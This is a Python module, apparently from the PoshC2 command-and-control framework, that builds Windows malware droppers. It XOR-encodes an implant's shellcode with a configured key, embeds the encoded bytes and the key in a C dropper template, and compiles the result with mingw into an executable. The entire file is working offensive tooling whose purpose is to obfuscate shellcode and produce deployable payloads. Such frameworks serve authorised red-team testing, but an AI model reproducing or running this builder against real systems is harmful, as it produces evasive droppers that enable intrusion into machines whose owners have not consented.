from poshc2.server.Config import PayloadTemplatesDirectory, PayloadsDirectory, XOR_KEY
from poshc2.Colours import Colours
import subprocess

def xor(data, key):
    key = key
    output = []
    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        output.append(current ^ current_key)

    return output

def c_char_arr(name, value):
    return 'char '+name+'[]'+'=''{0x' + ',0x'.join(hex(x)[2:] for x in value) + '};'

def create_payloads(payloads, name):

    archs = ["x64"]
    for arch in archs:
        # Get the shellcode based on the architecture
        with open("%s%sPosh_v4_%s_Shellcode.bin" % (PayloadsDirectory, name, arch), 'rb') as f:
            shellcodesrc = f.read()

        enc = xor(shellcodesrc, XOR_KEY)
        shellcode = c_char_arr('sc', enc)

        # Create the raw C file from the template
        with open(f"{PayloadTemplatesDirectory}dropper.xor", 'r') as f:
            content = f.read()

        content = str(content).replace("#REPLACEME#", shellcode).replace("#REPLACE_XOR_KEY#", c_char_arr('key', XOR_KEY))
        with open(f"{payloads.BaseDirectory}{name}Posh_v4_{arch}_xor.c", 'w') as f:
            f.write(content)

        payloads.QuickstartLog(Colours.END)
        payloads.QuickstartLog(f"XORed shellcode Payload written to: {payloads.BaseDirectory}{name}Posh_v4_{arch}_xor.c")

        subprocess.check_output(f"x86_64-w64-mingw32-gcc -s -w {payloads.BaseDirectory}{name}Posh_v4_{arch}_xor.c -o {payloads.BaseDirectory}{name}Posh_v4_{arch}_xor.exe", shell=True)
        payloads.QuickstartLog(Colours.END)
        payloads.QuickstartLog(f"exe Payload written to: {payloads.BaseDirectory}{name}Posh_v4_{arch}_xor.exe")
